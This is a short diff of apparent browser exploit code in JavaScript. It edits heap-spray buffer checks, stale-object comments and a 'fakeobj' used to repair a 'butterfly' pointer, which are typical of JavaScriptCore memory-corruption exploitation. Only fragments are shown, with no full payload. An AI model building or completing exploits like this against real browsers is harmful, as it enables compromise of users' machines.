@@ -14,7 +14,7 @@ var smsh = new Uint32Array(0x10)
 function keep(x) {
 	setTimeout(function() { alert("shit" + x) }, 10*60*1000);
 }
-var fakeobj = {};
+
 
 var mem0 = 0;
 var mem1 = 0;
@@ -167,12 +167,11 @@ function go_() {
 
 	for(i = 0; i < bufs.length; i++) {
 		for(k = 0; k < bufs[0].length; k++) {
-			// Check if this is what the stale object points t
-			// If this is true then stale[0] po
+			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
+			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
-				stale[0] = fakeobj;
-				//var fop = bufs[i][k];
+
  			
 
 				stale[0] = {
